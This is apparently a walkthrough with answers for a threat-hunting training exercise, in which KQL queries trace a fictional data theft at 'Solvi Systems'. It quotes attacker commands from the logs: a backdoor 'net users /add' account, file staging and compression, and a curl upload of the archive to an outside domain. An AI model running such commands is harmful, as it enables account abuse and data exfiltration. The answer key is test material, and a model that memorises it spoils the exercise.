## Solvi Systems: A tale of Supply Chains and ICS: Section 5: A Shocking Ending<br>
### **Summary**<br>
Looks like we hit a dead end. The threat actors didn't seem interested enough to do anything else on Carla's machine.
<br><br>
We can use this as an anchor point though. Perhaps the threat actor is a creature of habit.
<br><br>
Good news: we have new leads in our investigation. Bad news: we have more investigating to do! Let's explore these malicious emails that were sent by the adversary.
<br><br>

**Q1. How many distinct commands containing the term net use were run on SolviSystem devices?**<br><br>

```
ProcessEvents
| where process_commandline contains "net use"
| distinct process_commandline
```
<br>
Results returned are:<br><br>

```
net users /add gu@rd!an abc1toothree
net use
net use /PERSISTENT:YES
```
<br>
3 results are returned, but only 2 have commands.<br><br>

**Answer: 2**<br><br>

**Q2. What new command using net use did we find?**<br><br>
From previous query, a new command is shownn.<br><br>

**Answer: net use /PERSISTENT:YES**<br><br>

**Q3. How many distinct hosts was this command run on?**<br><br>

```
ProcessEvents
| where process_commandline == "net use /PERSISTENT:YES"
| distinct hostname
| count
```
<br>

**Answer: 3**<br><br>

**Q4. What is the timestamp for the first time this command was run?**<br><br>

```
ProcessEvents
| where process_commandline == "net use /PERSISTENT:YES"
```
<br>

**Answer: 5/27/2024, 4:23:10 PM**<br><br>

**Q5. What is the hostname from that timestamp?**<br><br>
Obtained from previous query.<br><br>

**Answer: SJ9V-MACHINE**<br><br>

**Q6. Who is the employee associated with that hostname?**<br><br>
The username (or hostname) of the hostname is 'alpetrov'. Run a query on Employees table to retrieve employees name.<br><br>

```
Employees
| where username == "alpetrov"
```
<br>

**Answer: Alexei Petrov**<br><br>

**Q7. What is that employee's role?**<br><br>
Obtained from previous query.<br><br>

**Answer: Docks Customer Success Manager**<br><br>

**Q8. What is the command used to copy files related to SoftwareDevelopment?**<br><br>

```
ProcessEvents
| where username == "alpetrov"
| where parent_process_name == "cmd.exe"
| where timestamp > datetime(5/27/2024, 4:23:10 PM)
```
<br>

**Answer: Copy-Item -Path \\\\solvisystems.com\\SharedDocs\\SoftwareDevelopment\\CycleDocuments\\* -Destination C:\\Users\\alpetrov\\CollectedData\\Software_Cycle_Docs**<br><br>

**Q9. What is the name of the archive file containing the copied documents?**<br><br>
The copied files were then compressed.<br><br>

```
Compress-Archive -Path C:\Users\alpetrov\CollectedData\* -DestinationPath C:\DataExfil\CollectedData.zip
```
<br>

**Answer: CollectedData.zip**<br><br>

**Q10. The next day the data was exfiltrated using what command?**<br><br>
Looking for a curl command.<br><br>

**Answer: curl -F 'file=@C:\DataExfil\CollectedData.zip' https://api.eco-awareness-update.net/upload**<br><br>

**Q11. How many accounts were used by the threat actor to exfiltrate sensitive information from Solvi Systems?**<br><br>
Look for uploads the the domain in previous answer.<br><br>

```
ProcessEvents
| where process_commandline contains "https://api.eco-awareness-update.net/upload"
| distinct hostname
```
<br>

**Answer: 3**<br><br>

**Q12. The threat actors were observed reading an "internal process" document from an internal portal called ____.solvisystems.com**<br><br>
Looking for inbound connections, past the date from question 4 and the url will contain 'solvisystems.com'<br><br>

```
InboundNetworkEvents
| where timestamp > datetime(5/27/2024, 4:23:10 PM)
| where url contains "solvisystems.com"
```
<br>

```
https://devportal.solvisystems.com/development_lifecycle/internal_process.pdf
```
<br>

**Answer:devportal**<br><br>

**Q13. What was the subject of those emails?**<br><br>
From question 3, there were 3 distinct hosts that the 'net use /PERSISTENT:YES' command was run on. These are"

- SJ9V-MACHINE - alexei_petrov@solvisystems.com
- UPLM-DESKTOP - jamie_lee@solvisystems.com
- JP4D-MACHINE - taylor_green@solvisystems.com

The email address for the hostname has been pulled from the employees table.

```
Email
| where subject contains "software"
| where sender == "alexei_petrov@solvisystems.com" or sender == "jamie_lee@solvisystems.com" or sender == "taylor_green@solvisystems.com"
```
<br>

Searching from the results, the subject column, can see multiple emails sent using the same subject line asking where DOCKS software documentation are stored.<br><br>

**Answer: Do you know where the DOCKS software documentation is stored? 🤪**<br><br>

**Q14. Congratulations! You've completed your investigation. Type "wooo" to receive credit**<br><br>

**Answer: wooo**<br><br>

**Q15. Type "guardians" to finish this module. Stay tuned for the next module to see what the guardians might do next! 😱**<br><br>

**Answer: guardians**<br><br>
